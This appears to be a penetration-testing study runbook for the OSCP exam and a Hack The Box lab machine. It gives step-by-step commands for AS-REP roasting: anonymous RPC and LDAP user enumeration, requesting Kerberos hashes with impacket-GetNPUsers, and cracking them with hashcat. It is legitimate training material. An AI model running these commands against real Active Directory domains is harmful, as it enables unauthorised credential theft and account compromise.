---
tags: [oscp, active-directory, asrep-roasting, runbook]
box_sources: [Forest]
---

# AD - AS-REP Roasting

*Find accounts where Kerberos pre-authentication is disabled, request an AS-REP ticket, and crack it offline.*

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `rpcclient -U '' -N $BoxIP -c 'enumdomusers'` | Domain users are listed | RPC null sessions are allowed | Compare with LDAP because the lists may differ | Build `$Userlist` | [[AD - Enumeration]] |
| `ldapsearch -x -H ldap://$BoxIP -b "DC=htb,DC=local" '(&(objectCategory=person)(objectClass=user))' sAMAccountName` | LDAP user objects are returned | Anonymous LDAP bind works | Include accounts found by either interface | Request tickets | [[AD - Enumeration]] |
| `impacket-GetNPUsers $Domain/ -dc-ip $BoxIP -usersfile $Userlist -no-pass -request -format hashcat -outputfile $LootDir/asrep.txt` | A hashcat-format ticket is saved | A candidate has `UF_DONT_REQUIRE_PREAUTH` | Check the file even if stdout is quiet | `hashcat -m 18200` | [[AD - Kerberoasting]] |
| `hashcat -m 18200 $LootDir/asrep.txt $Wordlist` | A password is recovered | The password is in the wordlist or rules | Store it as `$Password`, never in shared notes | [[AD - Credential Validation]] | Try rules or a targeted list |

## Gotchas

- Check clock skew before Kerberos tools. A difference over about five minutes can cause authentication failure.
- RPC and LDAP can expose different accounts.
- Never paste AS-REP ticket material into the transcript.

## Module Links

[[16. Password Attacks]]
[[22. Active Directory Introduction and Enumeration]]

## External Resources

- [HackTricks - AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproasting)
- [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
